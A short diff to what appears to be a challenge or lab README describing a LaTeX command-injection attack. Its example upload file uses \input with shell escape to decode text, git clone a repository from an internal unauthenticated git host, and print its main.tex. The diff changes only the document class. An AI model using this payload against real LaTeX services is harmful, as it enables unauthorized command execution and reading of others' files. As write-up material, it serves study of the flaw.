@@ -58,7 +58,7 @@ This container itself dose not check for any authentication when cloning.
 - Upload a file containing
 
 ```tex
-\documentclass[12pt]{scrartcl}
+\documentclass[12pt]{minimal}
 \usepackage{verbatim}
 \begin{document}
     \input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; git clone http://nginx-git/ID; cat ./ID/main.tex; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
